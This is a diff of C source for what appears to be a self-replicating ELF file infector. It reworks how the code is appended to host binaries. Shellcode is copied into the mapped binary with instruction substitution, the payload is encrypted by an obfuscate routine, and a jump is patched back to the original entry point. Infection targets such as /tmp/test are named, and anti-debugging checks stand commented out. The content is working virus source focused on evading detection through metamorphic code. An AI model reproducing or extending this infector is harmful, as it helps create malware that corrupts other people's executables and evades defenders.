@@ -45,7 +45,7 @@ int   entry_point(void *magic) {
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  asm("nop");
+  asm("int3");
   /* if (checkProcess(procName) != 0) */
   /*   return (stop(1, magic)); */
   /* if (preventDebug() == -1) */
@@ -579,45 +579,59 @@ static void obfuscate(char *header, size_t size) {
   }
 }
 
-#define MAX_INS_SIZE 10
+#define MAX_INS_SIZE 12
 
-char  yo[][MAX_INS_SIZE] __attribute__ ((section (".text"))) = {
-  "\x90",
+char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text"))) = {
   "\xcc",
-  "\x99",
-  ""
+  "\x90",
+  "",
+  /* "\x55", */
+  /* "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x5d\x55", */
+  /* "" */
 };
 
-static void modifyStructure(unsigned char *code, size_t size) {
-  size_t  i;
-  size_t  j;
-  size_t  k;
-  unsigned char    *ins;
+static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
+  size_t        i;
+  size_t        j;
+  size_t        k;
+  unsigned char *ins;
+  unsigned char *bin;
+  unsigned char *shellcode;
 
   i = 0;
+  bin = (void *)new->header;
+  shellcode = (void *)start;
   while (i < size) {
-    ins = (void *)modifyStructure - sizeof(yo);
-    while (ins != (void *)modifyStructure) {
+    ins = (void *)copyModifiedCode - sizeof(instructions);
+    while (ins != (void *)copyModifiedCode) {
       j = 0;
-      while (ins[j] != 0 && code[i + j] == ins[j])
+      while (ins[j] != 0 && shellcode[i + j] == ins[j])
         j += 1;
-      if (ins[j] != 0 || code[i + 20] == 0x99) {
+      if (ins[j] != 0) {
         while (ins[0] != 0)
           ins += MAX_INS_SIZE;
         ins += MAX_INS_SIZE;
         continue ;
       }
+      i += 1;
       // TODO Choose random replacement
       ins += MAX_INS_SIZE;
+      // TODO Check if enough space
       k = 0;
       while (k < j) {
-        code[i + k] = ins[k];
+        bin[binSize] = ins[k];
+        binSize += 1;
         k += 1;
       }
+      while (ins[0] != 0)
+        ins += MAX_INS_SIZE;
       ins += MAX_INS_SIZE;
     }
+    bin[binSize] = shellcode[i];
     i += 1;
+    binSize += 1;
   }
+  return (0);
 }
 
 static int  appendShellcode(struct bfile *bin) {
@@ -631,7 +645,9 @@ static int  appendShellcode(struct bfile *bin) {
   if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
     return (-1);
   memcpy(new.header, bin->header, bin->size);
-  memcpy(((void *)new.header) + bin->size, start, size);
+  copyModifiedCode(&new, bin->size, size);
+
+  /* memcpy(((void *)new.header) + bin->size, start, size); */
   address = -(0xc000000 + bin->size + size) + bin->header->e_entry - 6;
   ins[0] = 0xe9;
   ins[1] = (address >> 0) & 0xff;
@@ -643,7 +659,7 @@ static int  appendShellcode(struct bfile *bin) {
   ins[7] = (address >> 48) & 0xff;
   ins[8] = (address >> 56) & 0xff;
   memcpy(((void *)new.header) + bin->size + size, ins, sizeof(ins));
-  modifyStructure(((void *)new.header) + bin->size, size);
+  /* modifyStructure(((void *)new.header) + bin->size, size); */
   obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart);
   munmap(bin->header, bin->size);
   bin->header = new.header;
